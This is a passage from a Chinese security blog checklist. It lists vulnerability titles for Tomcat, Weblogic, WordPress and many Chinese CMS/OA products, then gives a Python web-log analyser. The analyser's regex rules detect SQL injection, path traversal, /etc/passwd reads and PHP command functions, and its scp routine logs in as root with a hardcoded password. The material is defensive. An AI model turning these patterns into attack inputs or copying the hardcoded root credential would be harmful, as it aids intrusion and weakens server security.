+ Tomcat 利用 &quot;进程注入&quot; 实现无文件复活 Webshell
+ Tomcat 后台爆破
+ Tomcat 后台部署war木马getshell
+ Tomcat样例目录session操纵漏洞
+ （CVE-2016-1240）Tomcat本地提权漏洞
+ （CVE-2016-8735）Tomcat 反序列化漏洞
+ （CVE-2017-12615）Tomcat PUT方法任意文件写入漏洞
+ （CVE-2017-12616）Tomcat 信息泄露
+ （CVE-2017-12617）Tomcat RCE via JSP Upload Bypass
+ （CVE-2018-1305）Tomcat 安全绕过漏洞
+ （CVE-2019-0221）Apache Tomcat SSI printenv指令中的XSS
+ （CVE-2019-0232）Tomcat rce
+ （CVE-2020-1938）Apache Tomcat 文件包含漏洞
+ （CVE-2020-9484）Tomcat session反序列化漏洞
+ 通过jmx攻击Tomcat
+ Typecho
+ Typecho 1.1 反序列化漏洞导致前台getshell
+ Ueditor
+ ueditor ssrf
+ ueditor 允许xml上传的xss漏洞
+ ueditor .net版本上传漏洞
+ 百度ueditor编辑器 xss漏洞
+ Umbraco CMS
+ Umbraco CMS 7.12.4 后台远程命令执行漏洞
+ UsualToolcms
+ UsualToolcms 8.0 系统重装漏洞
+ UsualToolcms 8.0 myup.php 前台任意文件删除
+ UsualToolcms 8.0 绕过后台验证码爆破
+ UsualToolcms 8.0 后台GETSHELL
+ UsualToolcms 8.0 a_users_level.php 后台盲注
+ UsualToolcms 8.0 前台sql
+ UsualToolcms 8.0 a_users_level.php 后台int型注入
+ UsualToolcms 8.0 a_pagex.php盲注
+ UsualToolcms 8.0 后台反射型XSS
+ UsualToolcms 8.0 a_bookx.php 后台注入漏洞
+ UsualToolcms 8.0 a_modsx.php 任意文件删除
+ uWSGI
+ uWSGI 未授权访问漏洞
+ （CVE-2018-7490）uWSGI PHP目录穿越漏洞
+ vBulletin
+ （CVE-2015-7808）VBulletin 远程命令执行漏洞
+ （CVE-2019-16759）vBulletin 5.x 远程命令执行漏洞
+ （CVE-2019-17132）vBulletin 5.0 &lt;5.5.4-&#39;updateAvatar&#39;身份验证的远程代码执行漏洞
+ （CVE-2020-12720）vBulletin 未授权sql注入漏洞
+ VMware
+ VMware vCenter Server &lt; 6.5u1 任意文件读取漏洞
+ （CVE-2020-3952）VMware vCenter Server 6.7 信息泄露漏洞
+ Webkit
+ （CVE-2018-4441）Webkit shiftCountWithArrayStorage
+ Weblogic
+ weblogic爆破
+ （CVE-2017-3248）Weblogic 反序列化漏洞
+ （CVE-2017-3506）Weblogic反序列化漏洞
+ （CVE-2017-10271）Weblogic XMLDecoder 反序列化漏洞
+ （CVE-2018-2628）Weblogic反序列化漏洞
+ （CVE-2018-2893）Weblogic WLS核心组件反序列化漏洞
+ （CVE-2018-2894）Weblogic任意文件上传
+ （CVE-2018-3191）Weblogic远程代码执行漏洞
+ （CVE-2018-3245）Weblogic反序列化远程代码执行漏洞
+ （CVE-2019-2615）Weblogic 任意文件读取漏洞
+ （CVE-2019-2618）Weblogic任意文件上传漏洞
+ （CVE-2019-2725）（CNVD-C-2019-48814）Weblogic反序列化远程代码执行漏洞
+ （CVE-2019-2729）Weblogic反序列化漏洞
+ （CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞
+ （CVE-2019-2890）Weblogic反序列化漏洞
+ （CVE-2020-2551）Weblogic CVE-2020-2551 IIOP协议反序列化rce
+ （CVE-2020-2555）Oracle Coherence&amp;Weblogic 反序列化远程代码执行漏洞
+ （CVE-2020-2883）Weblogic 远程代码执行漏洞
+ Webmin
+ （CVE-2019-15107）Webmin 远程命令执行漏洞
+ WeCenter
+ WeCenter 3.3.4 前台sql注入
+ WeCenter 3.3.4 任意文件删除
+ WeCenter 3.3.4 远程命令执行
+ WellCMS
+ WellCMS 1.1.02 任意用户密码重置漏洞
+ WellCMS 2.0 Beta3 后台任意文件上传
+ Wordpress
+ Wordpress 插件漏洞
+ WordPress Plugin - Baidu xss漏洞
+ WordPress Plugin - Google Review Slider 6.1 SQL Injection
+ WordPress Plugin - NextGEN Gallery &lt;= 3.2.2 RCE
+ WordPress Plugin - Easy WP SMTP 反序列化漏洞
+ WordPress Plugin - Quizlord 2.0 XSS
+ WordPress Plugin - AutoSuggest sql注入
+ WordPress Plugin - Social Warfare&lt;=3.5.2 RCE
+ WordPress Plugin - Search Meter 2.13.2 CSV Injection
+ WordPress Plugin - WPdiscuz 7.0.4 任意文件上传漏洞
+ WordPress Plugin - File Manager 任意文件上传漏洞
+ （CVE-2018-19287）WordPress Plugin - Ninja Forms 3.3.17 XSS
+ WordPress Plugin - Real-Time Find and Replace xss漏洞
+ （CVE-2019-9978）WordPress Plugin - social warfare 远程命令执行漏洞
+ （CVE- 2019-10866）WordPress Plugin - Form Maker 1.13.3 sql注入
+ （CVE-2019-15866）WordPress Plugin - Crelly Slider 任意文件上传&amp;RCE漏洞
+ （CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss
+ （CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss
+ （CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss
+ （CVE-2019-19133）WordPress Plugin - CSS Hero 4.0.3 反射xss
+ （CVE-2020-10385）WordPress Plugin - WPForms 1.5.9 储存型xss
+ （CVE-2020-12462）WordPress Plugin - Ninja Forms CSRF to XSS
+ Wordpress 系统漏洞
+ （从xss到getshell） xss的深层次利用与探讨
+ （CVE-2017-6514）WordPress 4.7.2 敏感信息泄漏
+ Wordpress &lt;= 4.7.4 XML-RPC API POST META 未校验漏洞
+ Wordpress &lt;= 4.8.2 POST META 校验绕过漏洞
+ （CVE-2017-8295）WordPress &lt;=4.8.3 任意密码重置/HOST头注入漏洞
+ （CVE-2018-6389）WordPress &lt;= 4.9.x 拒绝服务漏洞
+ Wordpress &lt;= 4.9.6 任意文件删除漏洞
+ （CVE-2019-6977）WordPress 5.0 rce
+ （CVE-2019-8943）WordPress 5.0.3 - Crop-image Shell Upload (Metasploit)
+ （CVE-2019-16219）WordPress 5.2.3 内置编辑器Gutenberg 储存型xss
+ （CVE-2019-17671）Wordpress &lt;= 5.2.3未授权访问
+ Wordpress 5.2.4 cors跨域劫持漏洞
+ WordPress &lt;=5.3.0 xmlrpc.php 拒绝服务漏洞
+ （CVE-2019-16773）WordPress 5.3.0 储存型xss
+ （CVE-2020-4046）WordPress 5.3.4 储型XSS
+ XAMPP
+ （CVE-2020-11107）XAMPP任意命令执行漏洞
+ XDCMS
+ XDCMS 1.0 sql注入漏洞（一）
+ XDCMS 1.0 sql注入漏洞（二）
+ XDCMS 1.0 csrf漏洞
+ XDCMS 1.0 xss漏洞
+ XDCMS 1.0 后台任意文件读取
+ XDCMS 1.0 任意文件包含漏洞
+ XDCMS 1.0 重装系统漏洞
+ XDCMS 1.0 后台配置文件getshell
+ XDCMS 3.0 后台登录窗sql注入漏洞
+ XDCMS 3.0 后台友情链接sql注入
+ XDCMS 3.0 数据库备份任意文件夹删除
+ X5music
+ X5music 后台登陆绕过+后台getshell
+ Xfilesharing
+ （CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell
+ （CVE-2019-18952）Xfilesharing 2.5.1本地文件包含
+ XStream
+ （CVE-2019-10173）Xstream 远程代码执行漏洞
+ XXL-JOB
+ XYHCMS
+ XYHCMS 3.2 后台任意文件删除漏洞
+ XYHCMS 3.2 后台任意文件下载
+ XYHCMS 3.5 后台任意文件读取
+ XYHCMS 3.6 后台代码执行漏洞（一）
+ XYHCMS 3.6 后台代码执行漏洞（二）
+ XYHCMS 3.6 后台代码执行漏洞（三）
+ XYHCMS 3.6 后台文件上传getshell（一）
+ XYHCMS 3.6 后台文件上传getshell（二）仅限Windows
+ YCCMS
+ YCCMS 3.4 反射型xss
+ YCCMS 3.4 任意文件删除
+ YCCMS 3.4 未授权更改管理员账号密码
+ YCCMS 3.4 任意文件上传漏洞（一）
+ YCCMS 3.4 任意文件上传漏洞（二）
+ Yii2
+ （CVE-2020-15148）Yii2框架反序列化漏洞
+ YouDianCMS
+ YouDianCMS 8.0 Storeage XSS
+ YouDianCMS 8.0 sql注入漏洞
+ Yunucms
+ Yunucms v2.0.7 后台xss
+ Yunucms v2.0.7 数据库泄露
+ Yunyecms
+ Yunyecms V2.0.2 前台注入漏洞（一）
+ Yunyecms V2.0.2 前台注入漏洞（二）
+ Yunyecms V2.0.2 后台注入漏洞（一）
+ Yunyecms V2.0.2 后台注入漏洞（二）
+ YXcms
+ YXcmsApp 1.4.3任意用户密码重置漏洞
+ YXCMS 1.4.7储存型xss
+ YXCMS 1.4.7任意文件删除
+ YXCMS 1.4.7任意文件写入
+ YXCMS 1.4.7SQL注入
+ （CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞
+ YzmCMS
+ YzmCMS v3.6 csrf
+ YzmCMS v3.6 远程命令执行
+ （CVE-2018-7653）YzmCMS v3.6 xss漏洞
+ （CVE-2018-8756）YzmCMS v3.7.1 Eval注入漏洞
+ （CVE-2018-19092）YzmCMS v5.2 xss漏洞
+ YzmCMS V5.3 后台ssrf
+ YzmCMS V5.4 后台getshell（一）
+ YzmCMS V5.4 后台getshell（二）
+ YzmCMS V5.7 用户模块时间盲注
+ Zabbix
+ （CVE-2016-10134）Zabbix latest.php sql注入漏洞
+ Zimbra
+ （CVE-2019-9621）（CVE-2019-9670）Zimbra 远程代码执行漏洞
+ Zzcms
+ Zzcms 2018 最新版重装getshell
+ Zzcms 8.2 任意用户密码修改
+ （CVE-2018-13056）Zzcms 8.3 任意文件删除
+ （CVE-2018-14961）Zzcms 8.3 前台sql注入
+ （CVE-2018-14962）Zzcms 8.3 储存型xss
+ （CVE-2018-14963）Zzcms 8.3 csrf
+ Zzzcms
+ Zzzcms 1.61 后台远程命令执行漏洞
+ Zzzcms 1.75 后台爆破+验证码问题
+ Zzzcms 1.75 xss漏洞
+ Zzzcms 1.75 ssrf
+ Zzzcms 1.75 前台sql注入
+ Zzzcms 1.75 后台地址泄露
+ Zzzcms 1.75 后台任意文件读取
+ 74cms
+ 74cms v4.2.1 - v4.2.129-后台getshell漏洞
+ 74cms v4.2.126-前台四处sql注入
+ 74cms v4.2.126-通杀sql注入
+ 74cms v4.2.126-任意文件读取漏洞
+ 74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞
+ 74cms v4.2.3 任意文件删除
+ 74cms v4.2.3 备份文件爆破
+ 74cms v4.2.3 任意文件读取
+ 74cms v5.0.1远程执行代码
+ 74cms v5.0.1前台sql注入
+ （CVE-2019-11374）74cms v5.0.1 后台跨站请求伪造(CSRF)漏洞
+ 74cms v6.0.4 反射型xss
+ 百家cms
+ 百家cms v4.1.4 任意文件删除漏洞
+ 百家cms v4.1.4 任意路径删除漏洞
+ 百家cms v4.1.4 远程文件上传漏洞
+ 百家cms v4.1.4 远程命令执行漏洞
+ 彩虹外链网盘
+ 宝塔
+ 禅道
+ 禅道8.2-9.2.1 注入GetShell
+ 禅道 11.6 sql注入漏洞
+ 禅道 11.6 任意文件读取
+ 禅道 11.6 远程命令执行漏洞
+ 禅道 &lt;= 12.4.2 后台getshell
+ 禅知
+ 稻草人cms
+ 稻草人cms 1.1.5 安装过程信息泄露和getshell
+ 稻草人cms 1.1.5 后台任意文件上传导致getshell
+ 稻草人cms 1.1.5 后台任意文件删除
+ 泛微OA
+ 泛微OA 日志泄露
+ 泛微OA 数据库配置文件读取
+ 泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库)
+ 泛微OA 管理系统RCE漏洞
+ 泛微云桥 E-Bridge 2018 2019 任意文件读取
+ 泛微OA E-cology &lt;=9.0 远程代码执行漏洞
+ 泛微OA E-cology &lt;=9.0 sql注入漏洞（一）
+ 泛微OA E-cology &lt;=9.0 sql注入漏洞（二）
+ 泛微OA E-cology &lt;=9.0 sql注入漏洞（三）
+ 泛微OA 9.0 前台getshell
+ 蓝天采集器
+ 联软科技
+ 齐治堡垒机
+ （CNVD-2019-09593）齐治堡垒机 ShtermClient-2.1.1 命令执行漏洞
+ （CNVD-2019-17294）齐治堡垒机 v5.0 后台命令执行漏洞
+ （CNVD-2019-20835）齐治堡垒机 前台远程命令执行漏洞
+ （CNVD-2020-56016）齐治堡垒机 v5.0 远程命令执行漏洞
+ 绿盟
+ 深信服
+ 数字化校园管理平台
+ 通达oa
+ 通达oa 小技巧
+ 通达oa 2007 sql注入漏洞
+ 通达oa 2011-2013 通杀getshell
+ （WooYun-2014-82678）通达oa 2013 2015 未授权获取帐号
+ 通达oa 2013 2015 XFF导致日志混淆
+ 通达oa 2013 2015 ⻚面敏感信息泄露
+ 通达oa 2013 2015 任意账号跳转
+ 通达oa 2013 2015 文件包含漏洞
+ 通达oa 2013 2015 sql注入
+ 通达oa 2013 2015 xss
+ 通达oa 2013 2015 越权访问
+ 通达oa 2013 2015 数据库脚本导⼊getshell
+ 通达oa 2013 2015 任意⽂件上传漏洞
+ 通达oa 11.2 后台getshell
+ 通达oa 2013 2015 2016 2017 V11 任意文件上传、远程命令执行漏洞、文件包含漏洞
+ 通达OA &lt; 11.5.200417 任意用户登录漏洞
+ 通达oa 11.5 sql注入漏洞
+ 通达oa 11.5 未授权访问漏洞
+ 通达oa 11.6 远程命令执行漏洞
+ 通达oa 11.7 后台sql注入漏洞、远程命令执行漏洞
+ 通达oa 11.7 后台邮箱模块sql注入漏洞
+ 通达oa 11.7 后台getshell
+ 微擎
+ 微擎 后台绕过禁用函数写shell
+ 微擎 低权限后台getshell
+ 微擎 0.7 sql注入漏洞
+ 微擎 0.8 后台任意文件删除
+ 微擎cms v1.8.2 后台getshell
+ 微擎cms v2.1.2 后台getshell
+ 信呼oa
+ 用友
+ 用友nc 6.5 反序列化漏洞
+ 用友GRP-u8 注入漏洞
+ 有道云笔记
+ 致远oa
+ 致远OA 帆软报表组件 前台XXE漏洞
+ 致远OA Session泄漏漏洞
+ 致远OA A6 test.jsp sql注入漏洞
+ 致远OA A6 search_result.jsp sql注入漏洞
+ 致远OA A6 setextno.jsp sql注入漏洞
+ 致远OA A6 重置数据库账号密码漏洞
+ 致远OA A6 敏感信息泄露（一）
+ 致远OA A6 敏感信息泄露（二）
+ 致远OA A8 未授权访问
+ 致远OA A8 任意用户密码修改漏洞
+ 致远OA A8 系统远程命令执行漏洞
+ 致远OA A8-m 后台万能密码
+ 致远OA A8-m 存在sql语句页面回显功能
+ 致远OA A8-v5 无视验证码撞库
+ 致远OA A8-v5 任意用户密码修改
+ 天融信
+ 天融信 Top-app LB负载均衡 sql注入漏洞
+ 天融信 数据防泄漏系统越权修改密码漏洞</code></pre><h2 id="附录0x02"><a href="#附录0x02" class="headerlink" title="附录0x02"></a><span id="附录0x02">附录0x02</span></h2><pre><code>#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import os
+import re
+from multiprocessing.dummy import Pool as ThreadPool
+import sys
+import time
+import pexpect
+
+# 规则列表
+rulelist = [&#39;\.\./&#39;, &#39;select.+(from|limit)&#39;, &#39;(?:(union(.*?)select))&#39;, &#39;having|rongjitest&#39;, &#39;sleep\((\s*)(\d*)(\s*)\)&#39;,
+            &#39;benchmark\((.*)\,(.*)\)&#39;, &#39;base64_decode\(&#39;, &#39;(?:from\W+information_schema\W)&#39;,
+            &#39;(?:(?:current_)user|database|schema|connection_id)\s*\(&#39;, &#39;(?:etc\/\W*passwd)&#39;,
+            &#39;into(\s+)+(?:dump|out)file\s*&#39;, &#39;group\s+by.+\(&#39;, &#39;xwork.MethodAccessor&#39;,
+            &#39;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\(&#39;,
+            &#39;xwork\.MethodAccessor&#39;, &#39;(gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\:\/&#39;,
+            &#39;java\.lang&#39;, &#39;\$_(GET|post|cookie|files|session|env|phplib|GLOBALS|SERVER)\[&#39;,
+            &#39;\&lt;(iframe|script|body|img|layer|div|meta|style|base|object|input)&#39;, &#39;(onmouseover|onerror|onload)\=&#39;,
+            &#39;.(bak|inc|old|mdb|sql|backup|java|class)$&#39;, &#39;\.(svn|htaccess|bash_history)&#39;,
+            &#39;(vhost|bbs|host|wwwroot|www|site|root|hytop|flashfxp).*\.rar&#39;,
+            &#39;(phpmyadmin|jmx-console|jmxinvokerservlet)&#39;, &#39;java\.lang&#39;,
+            &#39;/(attachments|upimg|images|css|uploadfiles|html|uploads|templets|static|template|data|inc|forumdata|upload|includes|cache|avatar)/(\\w+).(php|jsp)&#39;]
+SSH_PASSWD = &#39;toor&#39; #webserver密码
+
+def Auto_scp():
+    cmd = [&#39;scp -r root@192.168.188.131:/var/log/snort/* log-2016-07-28/40/&#39;,
+           &#39;scp -r root@192.168.188.131:/var/log/*.log log-2016-07-28/39/&#39;
+           ]
+    for line in cmd:
+        child = pexpect.spawn(line,timeout=300)
+        child.expect(&#39;password:&#39;)
+        child.sendline(SSH_PASSWD)
+        child.expect(pexpect.EOF)
+    return True
+
+def File_Search(filepath):
+    filelist = []
+    for lists in os.listdir(filepath):
+        path = os.path.join(filepath, lists)
+        if os.path.isfile(path):
+            filelist.append(path)
+        if os.path.isdir(path):
+            File_Search(path)
+    pool = ThreadPool(50)
+    results = pool.map(Log_Analysis, filelist)
+    pool.close()
+    pool.join()
+
+def Log_Analysis(filename):
+    content = open(filename).read()
+    r = open(&#39;result.txt&#39;, &#39;a&#39;) #需要本地先新建个result.txt文件
+    r.write(&#39;\n&#39; + &#39;=================== web_log_secAnalysis ===================&#39; + &#39;\n&#39; + filename + &#39;\n&#39;)
+    for regex in rulelist:
+        result_tmp = re.compile(regex,re.IGNORECASE).findall(content)
+        if result_tmp:
+            r.write(str(result_tmp) + &#39;\n&#39; )
+    return &#39;True&#39;
+
+if __name__ == &#39;__main__&#39;:
+    if len(sys.argv) &lt; 2:
+        print &quot;Usage: log_SecAnalysis.py filepath&quot;
+        sys.exit(0)
+    else:
+        if Auto_scp():
+            start = time.clock()
+            print &#39;====&gt; Log is analyzing, please wait for a moment &lt;==== &#39;
+            File_Search(sys.argv[1])
+            end = time.clock()
+            print &#39;分析完毕,共运行时长:&#39; + str(end - start)
+            sys.exit(0)
+        else:
+            print &#39;文件scp传输异常...&#39;</code></pre>
+      
+       <hr><span style="font-style: italic;color: gray;"> 知识来源于网络，本博客仅供于安全测试学习，禁止非法利用。——《安全法》 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>Web-CheckList</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="10fteam">10fteam</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-10-28, 15:18:44</p>
+    <p><span class="copy-title">最后更新:</span>2021-01-06, 23:50:02</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/Web-CheckList/" title="Web-CheckList">https://10fteam.github.io/Web-CheckList/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2021 10fteam</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#CTF','#encrypt_decrypt','#工具','#知识','#内网渗透','#CS','#C2','#kali','#漏洞','#HTB','#靶机','#writeup','#bypass','#Linux','#linux','#脚本','#信息搜集','#安全加固','#入侵检测','#应急响应','#CC','#拒绝服务','#DOS','#MSF','#proxy','#数据库','#database','#PHP','#代码审计','#PWN','#powershell','#域渗透','#python','#注入','#phpmyadmin','#SQL','#mssql','#Struts2','#vulhub','#CVE','#中间件','#windows','#backdoor','#xss','#DOM','#cms','#encode_decode','#shell','#后门','#靶场','#vulnhub','#僵尸网络','#webshell','#内存马','#远控','#免杀','#端口','#mimikatz','#提权','#CDN','#DLL','#蓝方','#防守','#WAF','#editor','#MISC','#逆向','#log','#后渗透','#FTP','#日志',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().split('\n').length - 1, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 40px;  <!--代码左边宽度-->
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        <!--width: 542px;-->
+        width: 270px;
+    }
+    .nav.fullscreen {
+        <!--margin-left: -542px;-->
+        margin-left: -270px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+
+
+</html>
